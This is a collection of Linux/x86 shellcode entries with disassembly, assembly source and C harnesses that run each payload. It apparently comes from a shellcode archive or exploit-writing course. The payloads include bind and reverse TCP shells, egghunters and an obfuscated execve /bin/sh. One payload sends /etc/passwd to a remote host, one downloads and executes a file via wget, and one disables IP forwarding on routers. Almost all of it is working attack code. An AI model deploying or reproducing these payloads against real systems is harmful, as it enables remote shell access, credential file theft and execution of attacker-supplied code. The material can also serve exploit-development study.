 8048084:   89 e1                   mov    ecx,esp
 8048086:   6a 10                   push   0x10
 8048088:   51                      push   ecx
 8048089:   56                      push   esi
 804808a:   89 e1                   mov    ecx,esp
 804808c:   cd 80                   int    0x80
 804808e:   b0 66                   mov    al,0x66
 8048090:   b3 04                   mov    bl,0x4
 8048092:   6a 01                   push   0x1
 8048094:   56                      push   esi
 8048095:   89 e1                   mov    ecx,esp
 8048097:   cd 80                   int    0x80
 8048099:   b0 66                   mov    al,0x66
 804809b:   b3 05                   mov    bl,0x5
 804809d:   52                      push   edx
 804809e:   52                      push   edx
 804809f:   56                      push   esi
 80480a0:   89 e1                   mov    ecx,esp
 80480a2:   cd 80                   int    0x80
 80480a4:   89 c3                   mov    ebx,eax
 80480a6:   31 c9                   xor    ecx,ecx
 80480a8:   b1 03                   mov    cl,0x3
080480aa <dupfd>:
 80480aa:   fe c9                   dec    cl
 80480ac:   b0 3f                   mov    al,0x3f
 80480ae:   cd 80                   int    0x80
 80480b0:   75 f8                   jne    80480aa 
 80480b2:   31 c0                   xor    eax,eax
 80480b4:   52                      push   edx
 80480b5:   68 6e 2f 73 68          push   0x68732f6e
 80480ba:   68 2f 2f 62 69          push   0x69622f2f
 80480bf:   89 e3                   mov    ebx,esp
 80480c1:   52                      push   edx
 80480c2:   53                      push   ebx
 80480c3:   89 e1                   mov    ecx,esp
 80480c5:   52                      push   edx
 80480c6:   89 e2                   mov    edx,esp
 80480c8:   b0 0b                   mov    al,0xb
 80480ca:   cd 80                   int    0x80
*/

#include <stdio.h>

/* 
 Port High/Low bytes
 Current port 31337 (7a69)
*/
#define PORTHL "\x7a\x69"

unsigned char code[] = 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
"\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
"\x66\x68"PORTHL"\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
"\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
"\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
"\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
"\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
"\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";

main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
    In The Name of G0D
    
    Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() 
    Size : 83 Bytes
    
    fun for routers ;)
    
    Author : By Hamid Zamani (aka HAMIDx9)
    Member of ^^Ashiyane Digital Security Team^^
    

Disassembly of section .text:

08048054 <_start>:
 8048054:   31 c0                   xor    %eax,%eax
 8048056:   50                      push   %eax
 8048057:   68 77 61 72 64          push   $0x64726177
 804805c:   68 5f 66 6f 72          push   $0x726f665f
 8048061:   68 34 2f 69 70          push   $0x70692f34
 8048066:   68 2f 69 70 76          push   $0x7670692f
 804806b:   68 2f 6e 65 74          push   $0x74656e2f
 8048070:   68 73 79 73 2f          push   $0x2f737973
 8048075:   68 72 6f 63 2f          push   $0x2f636f72
 804807a:   66 68 2f 70             pushw  $0x702f
 804807e:   89 e3                   mov    %esp,%ebx
 8048080:   31 c9                   xor    %ecx,%ecx
 8048082:   b1 01                   mov    $0x1,%cl
 8048084:   b0 05                   mov    $0x5,%al
 8048086:   cd 80                   int    $0x80
 8048088:   89 c3                   mov    %eax,%ebx
 804808a:   31 c9                   xor    %ecx,%ecx
 804808c:   51                      push   %ecx
 804808d:   6a 30                   push   $0x30
 804808f:   89 e1                   mov    %esp,%ecx
 8048091:   31 d2                   xor    %edx,%edx
 8048093:   b2 01                   mov    $0x1,%dl
 8048095:   b0 04                   mov    $0x4,%al
 8048097:   cd 80                   int    $0x80
 8048099:   31 c0                   xor    %eax,%eax
 804809b:   83 c0 06                add    $0x6,%eax
 804809e:   cd 80                   int    $0x80
 80480a0:   31 c0                   xor    %eax,%eax
 80480a2:   40                      inc    %eax
 80480a3:   31 db                   xor    %ebx,%ebx
 80480a5:   cd 80                   int    $0x80
*/

#include <stdio.h>

int main(int argc,char **argv)
{

char shellcode[] = "\x31\xc0\x50\x68\x77\x61\x72\x64\x68"
                   "\x5f\x66\x6f\x72\x68\x34\x2f\x69\x70"
                   "\x68\x2f\x69\x70\x76\x68\x2f\x6e\x65"
                   "\x74\x68\x73\x79\x73\x2f\x68\x72\x6f"
                   "\x63\x2f\x66\x68\x2f\x70\x89\xe3\x31"
                   "\xc9\xb1\x01\xb0\x05\xcd\x80\x89\xc3"
                   "\x31\xc9\x51\x6a\x30\x89\xe1\x31\xd2"
                   "\xb2\x01\xb0\x04\xcd\x80\x31\xc0\x83"
                   "\xc0\x06\xcd\x80\x31\xc0\x40\x31\xdb"
                   "\xcd\x80";
                   
     printf("Length: %d\n",strlen(shellcode));
     (*(void(*)()) shellcode)();
     
     return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title   : reversetcpbindshell  (92 bytes)
Date    : 16 May 2013
Author  : Russell Willis <codinguy@gmail.com>
Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)
 
$ objdump -D reversetcpbindshell -M intel

reversetcpbindshell:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    eax,eax
 8048062:       31 db                   xor    ebx,ebx
 8048064:       31 c9                   xor    ecx,ecx
 8048066:       31 d2                   xor    edx,edx
 8048068:       b0 66                   mov    al,0x66
 804806a:       b3 01                   mov    bl,0x1
 804806c:       51                      push   ecx
 804806d:       6a 06                   push   0x6
 804806f:       6a 01                   push   0x1
 8048071:       6a 02                   push   0x2
 8048073:       89 e1                   mov    ecx,esp
 8048075:       cd 80                   int    0x80
 8048077:       89 c6                   mov    esi,eax
 8048079:       b0 66                   mov    al,0x66
 804807b:       31 db                   xor    ebx,ebx
 804807d:       b3 02                   mov    bl,0x2
 804807f:       68 c0 a8 01 0a          push   0xa01a8c0
 8048084:       66 68 7a 69             pushw  0x697a
 8048088:       66 53                   push   bx
 804808a:       fe c3                   inc    bl
 804808c:       89 e1                   mov    ecx,esp
 804808e:       6a 10                   push   0x10
 8048090:       51                      push   ecx
 8048091:       56                      push   esi
 8048092:       89 e1                   mov    ecx,esp
 8048094:       cd 80                   int    0x80
 8048096:       31 c9                   xor    ecx,ecx
 8048098:       b1 03                   mov    cl,0x3
0804809a <dupfd>:
 804809a:       fe c9                   dec    cl
 804809c:       b0 3f                   mov    al,0x3f
 804809e:       cd 80                   int    0x80
 80480a0:       75 f8                   jne    804809a
 80480a2:       31 c0                   xor    eax,eax
 80480a4:       52                      push   edx
 80480a5:       68 6e 2f 73 68          push   0x68732f6e
 80480aa:       68 2f 2f 62 69          push   0x69622f2f
 80480af:       89 e3                   mov    ebx,esp
 80480b1:       52                      push   edx
 80480b2:       53                      push   ebx
 80480b3:       89 e1                   mov    ecx,esp
 80480b5:       52                      push   edx
 80480b6:       89 e2                   mov    edx,esp
 80480b8:       b0 0b                   mov    al,0xb
 80480ba:       cd 80                   int    0x80
*/

#include <stdio.h>

/*
 ipaddr 192.168.1.10 (c0a8010a)
 port 31337 (7a69)
*/
#define IPADDR "\xc0\xa8\x01\x0a"
#define PORT "\x7a\x69"

unsigned char code[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
"\x01\x6a\x02\x89\xe1\xcd\x80\x89"
"\xc6\xb0\x66\x31\xdb\xb3\x02\x68"
IPADDR"\x66\x68"PORT"\x66\x53\xfe"
"\xc3\x89\xe1\x6a\x10\x51\x56\x89"
"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"
"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"
"\xc0\x52\x68\x6e\x2f\x73\x68\x68"
"\x2f\x2f\x62\x69\x89\xe3\x52\x53"
"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"
"\x80";

main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title   : egghunter shellcode
        : hunter (30 bytes), marker (8 bytes), shellcode (28 bytes)
Date    : 28 May 2013
Author  : Russell Willis <codinguy@gmail.com>
Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)

Comments:
    Using sigaction system call for hunter code for robust operation.
    Based on paper 'Safely Searching Process Virtual Address Space'.
    This is a must read paper, instructive and inspiring, found here:
    http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
    see section 3.1.3 sigaction(2), page 13.
    
    To build:
    gcc -fno-stack-protector -z execstack egghunter.c -o egghunter
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
 * Marker code must be executable, currently:
 *   /x90 nop
 *   /x50 push eax
 */ 
#define MARKER "\x90\x50" 

char hunter[] = 
    "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1"
    "\xb8"MARKER""MARKER"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
char marker[] = MARKER; 
char shellcode[] = 
    "\x31\xc0\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
    "\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";
 
int 
main(void) 
{
    int i=0, nmarkers = 4, markerlen = sizeof(marker)-1;
    /* 
     * Setup area of memory for testing,
     * place marker and shellcode into area.
     */ 
    char *egg = malloc(128);
    memcpy(egg+(markerlen*nmarkers), shellcode, sizeof(shellcode)-1);
    do {
      memcpy(egg+i, marker, markerlen);
      i += markerlen;
    } while(i != (markerlen * nmarkers));
    /*
     * Run hunter to search for marker and jump to shellcode 
     */
    int (*ret)() = (int(*)())hunter;
    ret();
    free(egg);
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

Title   : Obfuscated execve /bin/sh (30 bytes)
Date    : 3rd July 2013
Author  : Russell Willis <codinguy@gmail.com>
System  : Linux/x86 (SMP Debian 3.2.41-2 i686)
  
To build:
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c

00000000  31C9              xor ecx,ecx
00000002  F7E9              imul ecx
00000004  51                push ecx
00000005  040B              add al,0xb
00000007  EB08              jmp short 0x11
00000009  5E                pop esi
0000000A  87E6              xchg esp,esi
0000000C  99                cdq
0000000D  87DC              xchg ebx,esp
0000000F  CD80              int 0x80
00000011  E8F3FFFFFF        call dword 0x9
00000016  2F                das
00000017  62696E            bound ebp,[ecx+0x6e]
0000001A  2F                das
0000001B  2F                das
0000001C  7368              jnc 0x86

*/

#include <stdio.h>
 
unsigned char code[] = \
"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
 
main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

Title   : Obfuscated tcp bind shell (112 bytes)
Date    : 3 July 2013
Author  : Russell Willis <codinguy@gmail.com>
System  : Linux/x86 (SMP Debian 3.2.41-2 i686)

To build:
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
    
00000000  D9EE              fldz
00000002  9BD97424F4        fstenv [esp-0xc]
00000007  5D                pop ebp
00000008  8D6D59            lea ebp,[ebp+0x59]
0000000B  31DB              xor ebx,ebx
0000000D  F7EB              imul ebx
0000000F  FEC3              inc bl
00000011  51                push ecx
00000012  6A06              push byte +0x6
00000014  6A01              push byte +0x1
00000016  6A02              push byte +0x2
00000018  FFD5              call ebp
0000001A  89C6              mov esi,eax
0000001C  FEC3              inc bl
0000001E  52                push edx
0000001F  66687A69          push word 0x697a
00000023  6653              push bx
00000025  89E1              mov ecx,esp
00000027  6A10              push byte +0x10
00000029  51                push ecx
0000002A  56                push esi
0000002B  FFD5              call ebp
0000002D  B304              mov bl,0x4
0000002F  6A01              push byte +0x1
00000031  56                push esi
00000032  FFD5              call ebp
00000034  B305              mov bl,0x5
00000036  52                push edx
00000037  52                push edx
00000038  56                push esi
00000039  FFD5              call ebp
0000003B  89C3              mov ebx,eax
0000003D  31C9              xor ecx,ecx
0000003F  B103              mov cl,0x3
00000041  FEC9              dec cl
00000043  B03F              mov al,0x3f
00000045  CD80              int 0x80
00000047  75F8              jnz 0x41
00000049  31DB              xor ebx,ebx
0000004B  F7E3              mul ebx
0000004D  51                push ecx
0000004E  EB13              jmp short 0x63
00000050  5E                pop esi
00000051  87E6              xchg esp,esi
00000053  87DC              xchg ebx,esp
00000055  B00B              mov al,0xb
00000057  CD80              int 0x80
00000059  5F                pop edi
0000005A  6A66              push byte +0x66
0000005C  58                pop eax
0000005D  89E1              mov ecx,esp
0000005F  CD80              int 0x80
00000061  57                push edi
00000062  C3                ret
00000063  E8E8FFFFFF        call dword 0x50
00000068  2F                das
00000069  62696E            bound ebp,[ecx+0x6e]
0000006C  2F                das
0000006D  2F                das
0000006E  7368              jnc 0xd8
*/

#include <stdio.h>

unsigned char code[] = \
"\xd9\xee\x9b\xd9\x74\x24\xf4\x5d\x8d\x6d\x59\x31\xdb\xf7"
"\xeb\xfe\xc3\x51\x6a\x06\x6a\x01\x6a\x02\xff\xd5\x89\xc6"
"\xfe\xc3\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51"
"\x56\xff\xd5\xb3\x04\x6a\x01\x56\xff\xd5\xb3\x05\x52\x52"
"\x56\xff\xd5\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd"
"\x80\x75\xf8\x31\xdb\xf7\xe3\x51\xeb\x13\x5e\x87\xe6\x87"
"\xdc\xb0\x0b\xcd\x80\x5f\x6a\x66\x58\x89\xe1\xcd\x80\x57"
"\xc3\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
    Title:      Multi-Egghunter
    Author:     Ryan Fenno (@ryanfenno)
    Date:       20 September 2013
    Tested on:  Linux/x86 (Ubuntu 12.0.3)

    Description:

    This entry represents an extension of skape's sigaction(2)
    egghunting method [1] to multiple eggs. It is similar in spirit
    to BJ 'SkyLined' Wever's omelet shellcode for Win32 [2]. The
    proof-of-concept presented here splits a reverse TCP bind shell [3]
    into two parts. The egghunter is not only responsible for finding
    the two eggs, but also for executing them in the correct order. It
    is readily extendable to any (reasonable) number of eggs.

    References:

    [1] skape, "Safely Searching Process Virtual Address Space",
        www.hick.org/code/skape/papers/egghunt-shellcode.pdf
    [2] Wever, Berend-Jan, "w32-SEH-omelet-shellcode",
        http://code.google.com/p/w32-seh-omelet-shellcode/
    [3] Willis, R. "reversetcpbindshell",
        http://shell-storm.org/shellcode/files/shellcode-849.php
*/

#include <stdio.h>

#define    MARKER  "\x93\x51\x93\x59"
#define    TAG1    "\x01\x51\x93\x59" // easiest to use latter three bytes
#define    TAG2    "\x02\x51\x93\x59" // of MARKER for latter three of TAGs

// first egg/tag/shellcode
#define    IPADDR  "\xc0\xa8\x7a\x01" // 192.168.122.1
#define    PORT    "\xab\xcd"         // 43981
unsigned char shellcode1[] =
MARKER
TAG1
//SHELLCODE1
"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80"
"\x96\xb0\x66\xb3\x03\x68"    IPADDR    "\x66\x68" PORT "\x66"
"\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80"
// perform the jump
"\x83\xc4\x20\x5f\x83\xec\x24\xff\xe7"
;
/*
global _start
section .text
_start:
    xor ebx, ebx
    mul ebx

    mov al, 0x66          ; socketcall() <linux/net.h>
    inc ebx               ; socket()
    push edx              ; arg3 :: protocol    = 0
    push ebx              ; arg2 :: SOCK_STREAM = 1
    push byte 0x2         ; arg1 :: AF_INET     = 2
    mov ecx, esp
    int 0x80
    xchg eax, esi         ; save clnt_sockfd in esi
    mov al, 0x66          ; socketcall()
    mov bl, 0x3           ; connect()
                          ; build sockaddr_in struct (srv_addr)
    push dword 0x017AA8C0 ;   IPv4 address 192.168.122.1 in hex (little endian)
    push word 0x697a      ;   TCP port 0x7a69 = 31337
    push word 0x2         ;   AF_INET = 2
    mov ecx, esp          ; pointer to sockaddr_in struct
    push dword 0x10       ; arg3 :: sizeof(struct sockaddr) = 16 [32-bits]
    push ecx              ; arg2 :: pointer to sockaddr_in struct
    push esi              ; arg1 :: clnt_sockfd
    mov ecx, esp
    int 0x80

    ;---- perform the jump
    ; looking at the stack at this point, the target for the jump
    ; is at $esp+0x20, so...
    add esp, 0x20
    pop edi
    sub esp, 0x24
    jmp edi
*/

// second egg/tag/shellcode
unsigned char shellcode2[] =
MARKER
TAG2
//SHELLCODE2
"\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89"
"\xe2\x53\x89\xe1\xcd\x80"
;
/*
global _start
section .text
_start:
    pop ebx           ; arg1 :: clnt_sockfd
    push 0x2
    pop ecx           ; loop from 2 to 0
dup2loop:
    mov byte al, 0x3F ; dup2(2)
    int 0x80
    dec ecx
    jns dup2loop      ; loop ends when ecx == -1
    xor eax, eax
    mov byte al, 0x0B ; execve(2)
    push edx          ; null terminator
    push 0x68732f2f   ; "hs//"
    push 0x6e69622f   ; "nib/"
    mov ebx, esp      ; arg1 :: "/bin/sh\0"
    push edx          ; null terminator
    mov edx, esp      ; arg3 :: envp = NULL array
    push ebx
    mov ecx, esp      ; arg2 :: argv array (ptr to string)
    int 0x80
*/

unsigned char egghunter[] =
"\x6a\x02\x59\x57\x51\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a\x43"
"\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"    MARKER    "\x89\xcf\xaf"
"\x75\xec\x89\xcb\x59\x20\xc8\xaf\x51\x89\xd9\x75\xe1\x59\xe2"
"\xd5\xff\xe7";
/*
    global _start
    section .text
    _start:
        push byte 0x2
        pop ecx             ; number of eggs
    eggLoop:
        push edi            ; memory location of ecx-th piece; first of
                            ; these is meaningless
        push ecx            ; save counter
        xor ecx, ecx        ; initialize ecx for memory search
    fillOnes:
        or cx, 0xfff
    shiftUp:
        inc ecx
        push byte 0x43      ; sigaction(2)
        pop eax
        int 0x80
        cmp al, 0xf2
        jz fillOnes
        mov eax, 0x59935193 ; marker
        mov edi, ecx
        scasd               ; advances edi by 0x4 if there is a match;
                            ; assumes direction flag (DF) is not set
        jnz shiftUp
        mov ebx, ecx        ; save off ecx in case we need to keep looking
        pop ecx             ; restore counter
        and al, cl          ; tag in eax
        scasd
        push ecx
        mov ecx, ebx
        jnz shiftUp
        pop ecx
        loop eggLoop
        jmp edi
*/

void main() {
    printf("egghunter length:   %d\n", sizeof(egghunter)-1);
    printf("shellcode1 length:  %d\n", sizeof(shellcode1)-1);
    printf("shellcode2 length:  %d\n", sizeof(shellcode2)-1);
    ((int(*)())egghunter)();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/about
; License http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode reads /etc/passwd and sends the content to 127.1.1.1 port 12345. 
; The file can be recieved using netcat:
; $ nc -l 127.1.1.1 12345

section .text

global _start

_start:
    ; socket
    push BYTE 0x66    ; socketcall 102
    pop eax
    xor ebx, ebx 
    inc ebx 
    xor edx, edx
    push edx 
    push BYTE 0x1
    push BYTE 0x2
    mov ecx, esp
    int 0x80
    mov esi, eax

    ; connect
    push BYTE 0x66 
    pop eax
    inc ebx
    push DWORD 0x0101017f  ;127.1.1.1
    push WORD 0x3930  ; Port 12345
    push WORD bx
    mov ecx, esp
    push BYTE 16
    push ecx
    push esi
    mov ecx, esp
    inc ebx
    int 0x80

    ; dup2
    mov esi, eax
    push BYTE 0x1
    pop ecx
    mov BYTE al, 0x3F
    int 0x80
    
    ;read the file
    jmp short call_shellcode
    
shellcode:
    push 0x5
    pop eax
    pop ebx
    xor ecx,ecx
    int 0x80
    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    xor edx,edx
    mov dh,0xff
    mov dl,0xff
    int 0x80
    mov edx,eax
    push 0x4
    pop eax
    mov bl, 0x1
    int 0x80
    push 0x1
    pop eax
    inc ebx
    int 0x80
    
call_shellcode:
    call shellcode
    message db "/etc/passwd"
    
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x68\x7f\x01\x01\x01\x66\x68\x30\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x89\xc6\x6a\x01\x59\xb0\x3f\xcd\x80\xeb\x27\x6a\x05\x58\x5b\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x31\xd2\xb6\xff\xb2\xff\xcd\x80\x89\xc2\x6a\x04\x58\xb3\x01\xcd\x80\x6a\x01\x58\x43\xcd\x80\xe8\xd4\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

main()
{

    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
; Filename: downloadexec.nasm
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/
; Tested on: Ubuntu 12.04 / 32Bit
; License: http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode:
; - download 192.168.2.222/x with wget
; - chmod x
; - execute x
; - x is an executable
; - length 108 bytes

global _start

section .text

_start:

    ;fork
    xor eax,eax
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    mov al,0x7
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    
child:
    ;download 192.168.2.222//x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    push 0x782f2f32 ;2//x avoid null byte
    push 0x32322e32 ;22.2
    push 0x2e383631 ;.861
    push 0x2e323931 ;.291
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
    
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x2a\x31\xc0\xb0\x07\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\x68\x32\x2f\x2f\x78\x68\x32\x2e\x32\x32\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;Description:  JMP-CALL-POP execve shell (52 bytes)
;Shellcode:    \xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68
;Author:       Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:      526 

global _start

section .text
_start:
    jmp short here

me:
    pop esi
    mov edi,esi
    
    xor eax,eax
    push eax
    mov edx,esp
    
    push eax
    add esp,3
    lea esi,[esi +4]
    xor eax,[esi]
    push eax
    xor eax,eax
    xor eax,[edi]
    push eax
    mov ebx,esp 

    xor eax,eax
    push eax
    lea edi,[ebx]
    push edi
    mov ecx,esp

    mov al,0xb
    int 0x80

here:
    call me
    path db "//bin/sh"



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;Description:   Copy /etc/passwd to /tmp/outfile (97 bytes)
;Shellcode:     \x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80
;Author:        Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:       526 

global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;author: Shihao Songss3695@drexel.edu
;decoding will be divided into two parts
;First, shift right to get the original shellcode with prefix "0xAA"
;Second, delete all the "0xAA" prefix and reformat the shellcode

; shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
; encode = ""
; 
; for x in bytearray(shellcode) :
;     if x < 128:
;         x=x<<1      
;         encode += '0xAA,'
;     encode += '0x'
;     encode += '%02x,'%x
; 
; print encode

global _start
section .text
_start:

jmp short call_shellcode

decoder:

pop esi             ;now esi contains the address of encoded shellcode
mov edi, esi        ;this is for formatting

decode:
mov bl, byte [esi]
xor bl, 0xBB        ;bl is for testing end
jz formatting       ;First step is done

mov cl, byte [esi]
xor cl, 0XAA
jz shift_decode
inc esi
jmp short decode


shift_decode:
mov dl, byte [esi + 1]
shr dl,1            ;shift next instruction
mov byte [esi + 1], dl
inc esi
jmp short decode

formatting:
mov eax, edi
mov bl, byte [eax]
xor bl, 0xBB        ;now formatting complete
jz encoded          ;starts to execute
format:
mov bl, byte [eax]  ;bl is for testing end
mov cl, byte [eax]  ;cl is for testing prefix
xor cl, 0xAA
jnz Next_Cycle

Cycle:
mov dl, byte [eax]
xor dl, 0xBB
jz Next_Cycle       ;This cycle ends here
mov dl, byte [eax + 1]
mov byte [eax], dl
inc eax
jmp short Cycle

Next_Cycle:
inc edi
jmp short formatting

call_shellcode:

call decoder
encoded: db 0xAA,0x62,0xc0,0xAA,0xa0,0xAA,0xd0,0xAA,0x5e,0xAA,0x5e,0xAA,0xe6,0xAA,0xd0,0xAA,0xd0,0xAA,0x5e,0xAA,0xc4,0xAA,0xd2,0xAA,0xdc,0x89,0xe3,0xAA,0xa0,0x89,0xe2,0xAA,0xa6,0x89,0xe1,0xb0,0xAA,0x16,0xcd,0x80,0xBB



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;Description:   JMP-FSTENV execve shell (67 bytes)
